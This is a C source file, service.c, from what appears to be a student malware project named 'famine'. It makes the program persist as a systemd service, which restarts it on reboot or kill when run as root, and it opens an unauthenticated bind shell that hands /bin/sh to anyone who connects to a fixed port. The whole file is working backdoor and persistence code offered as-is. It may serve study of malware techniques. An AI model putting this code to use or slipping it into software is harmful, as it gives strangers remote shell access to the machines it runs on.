/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/19 11:03:53 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include "service.h"

#include <unistd.h>
#include <stdlib.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <netinet/in.h>

/*
	Setup program as a systemd service, it will restart when host reboots and when it is killed

	see SERVICE_FILE_CONTENT and SERVICE_FILE defines
*/
static int	setup_service_file()
{
	int	fd;

	fd = open(SERVICE_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fd == -1)
		return (-1);

	write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));
	system(SERVICE_ENABLE);
	system(SERVICE_START);
	return (0);
}

static int	run_bind_shell(void)
{
	int				srv_fd;
	int				cli_fd;
	int				opt;
	struct sockaddr_in	addr;

	srv_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (srv_fd == -1)
		return (-1);

	opt = 1;
	setsockopt(srv_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(BIND_SHELL_PORT);

	if (bind(srv_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
	{
		close(srv_fd);
		return (-1);
	}

	if (listen(srv_fd, 1) == -1)
	{
		close(srv_fd);
		return (-1);
	}

	while (1)
	{
		cli_fd = accept(srv_fd, NULL, NULL);
		if (cli_fd == -1)
			continue;

		if (fork() == 0)
		{
			close(srv_fd);
			dup2(cli_fd, STDIN_FILENO);
			dup2(cli_fd, STDOUT_FILENO);
			dup2(cli_fd, STDERR_FILENO);
			close(cli_fd);
			execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
			exit(1);
		}
		close(cli_fd);
	}
	close(srv_fd);
	return (0);
}

int	run_service()
{
	t_service_ctx	ctx = {0};

	ctx.super_user = getuid() == 0;

	if (lock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE) == -1)
		return (-1);

	if (ctx.super_user)
		setup_service_file();

	run_bind_shell();

	return (unlock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE));
}
